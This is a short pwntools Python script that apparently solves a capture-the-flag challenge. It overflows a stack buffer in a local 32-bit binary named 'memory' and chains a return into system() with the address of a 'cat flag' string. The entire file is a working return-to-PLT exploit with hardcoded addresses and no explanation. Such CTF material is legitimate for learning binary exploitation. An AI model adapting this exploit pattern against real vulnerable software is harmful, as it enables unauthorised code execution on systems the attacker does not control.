# coding:utf-8

from pwn import *

context(os='linux', arch='i386', log_level='debug')

p = process('memory')
elf = ELF('memory')

padding = 'a' * 0x13
fake_ebp = 'jkjk'

cat_flag_addr = 0x080487E0
#system_addr = elf.plt['system']
#main_addr = elf.sym['main']
system_addr = 0x08048440
main_addr = 0x08048677
payload = padding + fake_ebp + p32(system_addr) + p32(main_addr) + p32(cat_flag_addr)

#p.recvuntil("> ")'
p.recv()
p.sendline(payload)
p.recv()
